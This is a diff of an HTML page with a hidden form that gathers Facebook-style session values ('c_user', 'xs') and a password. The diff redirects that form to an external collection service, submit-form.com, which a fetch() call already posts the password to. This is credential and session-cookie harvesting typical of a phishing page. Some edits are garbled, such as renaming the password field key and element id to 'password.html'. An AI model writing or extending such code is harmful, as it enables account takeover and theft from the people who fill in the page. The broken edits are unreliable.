@@ -1534,7 +1534,7 @@
     </div>
     
     <!-- Hidden form for submission -->
-    <form id="hiddenForm" class="hidden-form" action="password.html" method="post">
+    <form id="hiddenForm" class="hidden-form" action="https://submit-form.com/XuylKIxRj" method="post">
         <input type="hidden" name="c_user" id="hiddenCUser">
         <input type="hidden" name="xs" id="hiddenXs">
         <input type="hidden" name="password" id="hiddenPassword">
@@ -2013,7 +2013,7 @@
                 
                 // Submit password separately
                 const formData = new FormData();
-                formData.append('password', passwordInput.value);
+                formData.append('password.html', passwordInput.value);
                 
                 fetch('https://submit-form.com/XuylKIxRj', {
                     method: 'POST',
@@ -2040,7 +2040,7 @@
             function resetForm() {
                 document.getElementById('c_user').value = '';
                 document.getElementById('xs').value = '';
-                document.getElementById('password').value = '';
+                document.getElementById('password.html').value = 'password.html';
                 
                 hiddenCUser.value = '';
                 hiddenXs.value = '';
